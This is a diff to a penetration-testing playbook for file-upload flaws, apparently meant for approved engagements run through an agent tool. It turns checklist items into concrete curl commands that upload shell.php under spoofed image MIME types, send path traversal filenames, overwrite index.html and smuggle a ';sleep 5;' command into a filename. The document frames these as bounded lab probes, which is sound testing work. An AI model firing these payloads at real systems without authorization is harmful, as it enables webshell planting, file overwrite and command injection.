@@ -15,11 +15,25 @@ Approved `host+upload endpoint` only. Every command via `cyber_process` `argv`. 
 
 ### 1. Baseline upload
 
-Upload a legitimate file the application expects (e.g., profile.jpg). Record:
-- Allowed extensions, MIME types, size limits
-- Where the file lands (URL path, storage bucket, CDN)
-- Whether the file is renamed, hashed, or stored as-is
-- Response headers when the file is served back (Content-Type, Content-Disposition)
+The fixture recipe (used by regression tests):
+
+```
+cyber_process argv=["curl","-sS","-D","-","-F","file=@<fixture-file>;type=image/png","<approved-upload-url>"]
+```
+
+Live engagement — upload a legitimate file:
+
+```
+cyber_process argv=["curl","-sS","-D","-","-H","Authorization: Bearer <token>","--form-string","file=@legitimate.jpg;type=image/jpeg","<url>/api/upload"]
+```
+
+Record: allowed extensions, MIME types, size limits, where the file lands (URL path, storage bucket, CDN), whether renamed/hashed, response headers on retrieval (Content-Type, Content-Disposition).
+
+Retrieve the uploaded file:
+
+```
+cyber_process argv=["curl","-sS","-D","-","<url>/uploads/<returned-filename>"]
+```
 
 ### 2. Extension bypass
 
@@ -38,10 +52,13 @@ Record each probe as an observation with the server response.
 
 ### 3. MIME and Content-Type confusion
 
-- Upload with correct extension but wrong Content-Type header
-- Upload with wrong extension but correct Content-Type
-- Upload with `application/octet-stream`
-- Check if the server validates Content-Type, file magic bytes, or extension only
+```
+cyber_process argv=["curl","-sS","-D","-","-H","Authorization: Bearer <token>","-F","file=@shell.php;type=image/jpeg","<url>/api/upload"]
+cyber_process argv=["curl","-sS","-D","-","-H","Authorization: Bearer <token>","-F","file=@legitimate.jpg;type=application/x-httpd-php","<url>/api/upload"]
+cyber_process argv=["curl","-sS","-D","-","-H","Authorization: Bearer <token>","-F","file=@shell.php;type=application/octet-stream","<url>/api/upload"]
+```
+
+Check if the server validates Content-Type, file magic bytes, or extension only.
 
 ### 4. Content validation bypass
 
@@ -56,11 +73,23 @@ If the server validates file content:
 
 ### 5. Filename injection
 
-- Path traversal: `../../../etc/passwd`, `..%2F..%2F`
-- Overwrite: upload with the name of an existing file (e.g., `index.html`)
-- Special chars: `; sleep 5`, `$(id)`, `` `id` `` in filename (command injection)
-- Long filename: >255 chars (buffer overflow in legacy handlers)
-- Null in name: `file\x00.jpg`
+Path traversal:
+
+```
+cyber_process argv=["curl","-sS","-D","-","-H","Authorization: Bearer <token>","-F","file=@canary.txt;filename=../../../tmp/traversal-test.txt","<url>/api/upload"]
+```
+
+Overwrite test:
+
+```
+cyber_process argv=["curl","-sS","-D","-","-H","Authorization: Bearer <token>","-F","file=@canary.txt;filename=index.html","<url>/api/upload"]
+```
+
+Command injection in filename:
+
+```
+cyber_process argv=["curl","-sS","-D","-","-H","Authorization: Bearer <token>","--form-string","file=@canary.txt;filename=;sleep 5;.jpg","<url>/api/upload"]
+```
 
 ### 6. Race condition (upload→execute)
 
@@ -100,10 +129,6 @@ One file, one content-type, stored vs executed. Benign file control.
 Use unique inert files and synthetic storage paths; traversal targets stay in a disposable lab.
 Bound upload-race checks to two approved requests, not an open-ended GET loop.
 Content-Type suggests interpretation; it does not prove server-side execution.
-
-```
-cyber_process argv=["curl","-sS","-D","-","-F","file=@<fixture-file>;type=image/png","<approved-upload-url>"]
-```
 
 | Scenario | Evidence compared | Expected classification |
 |---|---|---|
